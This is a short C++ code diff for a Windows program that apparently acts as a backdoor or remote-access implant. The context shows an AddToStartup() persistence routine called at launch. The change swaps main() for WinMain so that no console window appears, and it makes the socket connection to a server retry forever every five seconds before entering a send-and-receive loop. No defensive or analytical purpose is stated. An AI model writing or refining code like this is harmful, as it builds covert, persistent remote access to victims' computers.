@@ -51,7 +51,7 @@ bool AddToStartup() {
     return true;
 }
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
     AddToStartup();
 
@@ -85,29 +85,32 @@ int main() {
 
     // Attempt to connect to the first address returned by the call to getaddrinfo
     ptr = result;
-    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 
-    if (ConnectSocket == INVALID_SOCKET) {
-        std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
-        freeaddrinfo(result);
-        WSACleanup();
-        return 1;
-    }
+    // Try to connect multiple times
+    while (true) {
+        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (ConnectSocket == INVALID_SOCKET) {
+            std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
+            freeaddrinfo(result);
+            WSACleanup();
+            return 1;
+        }
 
-    // Connect to server.
-    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-    if (iResult == SOCKET_ERROR) {
-        closesocket(ConnectSocket);
-        ConnectSocket = INVALID_SOCKET;
+        // Connect to server.
+        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        if (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+
+            // If this was not the last attempt, wait for 5 seconds before trying again
+            std::cout << "Connection failed, retrying in 5 seconds...\n";
+            Sleep(5000); // Wait for 5 seconds before trying again
+        } else {
+            break;
+        }
     }
 
     freeaddrinfo(result);
-
-    if (ConnectSocket == INVALID_SOCKET) {
-        std::cout << "Unable to connect to server!" << std::endl;
-        WSACleanup();
-        return 1;
-    }
 
     // Receive and send data
     do {
